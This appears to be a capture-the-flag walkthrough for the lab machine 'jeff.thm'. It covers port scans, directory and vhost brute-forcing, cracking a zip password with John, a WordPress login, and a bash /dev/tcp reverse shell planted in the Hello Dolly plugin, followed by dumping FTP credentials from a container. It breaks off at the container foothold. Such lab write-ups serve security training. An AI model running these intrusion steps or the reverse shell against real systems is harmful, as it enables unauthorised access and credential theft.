ip add:10.10.150.85

rustscan:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

nmap:
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDg4z+/foDFEWvhoIYbCJR1YFXJSwUz3Tg4eFCje6gUXuRlCbi+AFLKT7Z7YeukAOdGfucg+sDdVG1Uay2MmT0YcWpPaWgJUmeHP3u3fYzwXgc2hwrHag+VTuuRM8zwwyR6gjRFIv1F9zTSPJBCkCWIHulcklArT8OMWLdKVCNK3B8ml92yUIA3HqnsN4DlGOTbYkpKd1G33zYNTXDDPwSi2N29rxWYdfRIJGjGfVT+EXFzccLtK+n+BJqsislTXv7h2Xi2aAJhw66RjBLoopu86ugdayaBb/Wfc1x1vQXAJAnAO02GPKueq/IzFUYGh/dlci7VG1qTz217chshXTqX
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNCLV+aPDHn2ot0aIXSYrRbvARScbRpkGp+hjzAI2iInTc6jgb7GooapeEZOpacn4zFpsI/PR8wwA2QhYXi3aNE=
|   256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx35hakinwovxQnAWprmEBqZNVlj7JjrZO1WxDc/RF/
80/tcp open  http    syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

gobuster: on jeff.thm
/admin (Status: 301)
/assets (Status: 301)
/backups (Status: 301)
/index.html (Status: 200)
/uploads (Status: 301)


gobuster on jeff.thm/backups/
$ gobuster dir  -u http://jeff.thm/backups/  -w /usr/share/wordlists/dirb/common.txt  -x tar,zip,rar
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jeff.thm/backups/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     rar,tar,zip
[+] Timeout:        10s
===============================================================
2023/01/13 07:56:37 Starting gobuster
===============================================================
/backup.zip (Status: 200)
/index.html (Status: 200)



visiting the website, and viewing the page source we have the following hint
<!-- Did you forget to add jeff.thm to your hosts file??? -->


download bakup.zip and move it to the work forlder. It seems to be passwd protected
zip2john backup.zip > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!Burningbird!!  (backup.zip)     
1g 0:00:00:01 DONE (2023-01-13 07:59) 0.9433g/s 13531Kp/s 13531Kc/s 13531KC/s "2parrow"..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

extrack the files using the passwd: !!Burningbird!!

reading the wpadmin file we find:
wordpress password is: phO#g)C5dhIWZn3BKP
 
It seems that there is a wp site. Time to run wpscan on jeff.thm
wpscan --url jeff.thm --enumerate u                    
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n

Scan Aborted: The remote website is up, but does not seem to be running WordPress.

jeff.thm does not run Wordpress

It's time to investigate where is the wp site

gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://jeff.thm -t 20                                                                                      4 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://jeff.thm
[+] Threads:      20
[+] Wordlist:     /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2023/01/13 08:03:40 Starting gobuster
===============================================================
Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
Progress: 11372 / 220561 (5.16%)^C

add this new site to /etc/hosts and use wpscan again

[+] jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

 WordPress theme in use: twentytwenty
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/


Interesting Entries:
 |  - Server: nginx
 |  - X-Powered-By: PHP/7.3.17

now that we have the username and pass we can log in to wordpress
wordpress.jeff.thm/wp-admin
jeff
phO#g)C5dhIWZn3BKP

now we can upload a php-reverse-shell.php to 404 template page -> this doesnt work !!!!!


we can use Holly Dolly plugin in order to get a rev shell
go to plugin editor and select holly dolly
add this to the end of the text:
exec("/bin/bash -c 'bash -i > /dev/tcp/[your IP]/[PORT] 0>&1'");

start a nc shell then activate the plugin in order to receive a rev shell

we get a shell, but it seems to be a container

cat ftp_backup.php
<?php
/* 
    Todo: I need to finish coding this database backup script.
          also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id); 


